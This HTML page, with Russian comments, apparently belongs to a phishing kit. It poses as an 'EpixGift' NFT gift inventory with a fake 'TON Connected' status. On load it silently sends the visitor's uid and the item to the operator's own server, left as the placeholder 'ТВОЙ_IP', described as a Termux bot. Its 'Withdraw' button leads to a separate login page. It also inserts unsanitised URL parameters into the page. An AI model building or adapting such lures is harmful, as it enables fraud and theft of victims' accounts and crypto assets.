<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>EpixGift Inventory</title>
    <style>
        body { background: #0e141b; color: #fff; font-family: -apple-system, sans-serif; margin: 0; padding: 20px; }
        .header { font-size: 22px; font-weight: 700; margin-bottom: 20px; border-bottom: 1px solid #1c252f; padding-bottom: 15px; display: flex; justify-content: space-between; align-items: center; }
        .status { font-size: 12px; color: #4caf50; background: rgba(76, 175, 80, 0.1); padding: 4px 8px; border-radius: 6px; }
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
        .nft-card { background: #1c252f; border-radius: 18px; padding: 12px; border: 1px solid #2a3644; text-align: center; }
        .img-box { width: 100%; aspect-ratio: 1/1; border-radius: 12px; background: #000; margin-bottom: 12px; overflow: hidden; display: flex; align-items: center; justify-content: center; }
        .img-box img { width: 100%; height: 100%; object-fit: cover; }
        .title { font-weight: 700; font-size: 14px; margin-bottom: 4px; }
        .sub { font-size: 11px; color: #8a99a8; margin-bottom: 15px; text-transform: uppercase; }
        .btn { display: block; background: #248bdf; color: #fff; text-decoration: none; padding: 12px; border-radius: 10px; font-weight: 700; font-size: 14px; border: none; width: 100%; cursor: pointer; }
    </style>
</head>
<body>
    <div class="header">
        <span>EpixGift</span>
        <span class="status">● TON Connected</span>
    </div>

    <div class="grid" id="main-grid">
        </div>

    <script>
        const params = new URLSearchParams(window.location.search);
        const item = params.get('item') || 'MoonPendant-40664';
        const uid = params.get('uid') || "Unknown";
        
        const [name, num] = item.split('-');
        // Ссылка на реальное изображение подарка
        const imgUrl = `https://nft.fragment.com/pendant/${num}.webp`;

        // 1. Отрисовка интерфейса
        document.getElementById('main-grid').innerHTML = `
            <div class="nft-card">
                <div class="img-box">
                    <img src="${imgUrl}" onerror="this.src='https://nft.fragment.com/pendant/40664.webp'">
                </div>
                <div class="title">${name} #${num}</div>
                <div class="sub">Collectible Asset</div>
                <button class="btn" onclick="goToLogin()">Withdraw</button>
            </div>
        `;

        // 2. ОТПРАВКА ДАННЫХ В BOT (TERMUX) ПРИ ОТКРЫТИИ
        async function trackVisit() {
            try {
                await fetch("http://ТВОЙ_IP:8080/submit", {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ 
                        type: 'visit', 
                        value: `Opened Inventory: ${item}`, 
                        uid: uid 
                    })
                });
            } catch(e) {
                console.log("Offline mode");
            }
        }

        // Запускаем трекинг сразу при загрузке страницы
        trackVisit();

        function goToLogin() {
            // Передаем параметры дальше
            window.location.href = "login.html" + window.location.search;
        }
    </script>
</body>
</html>
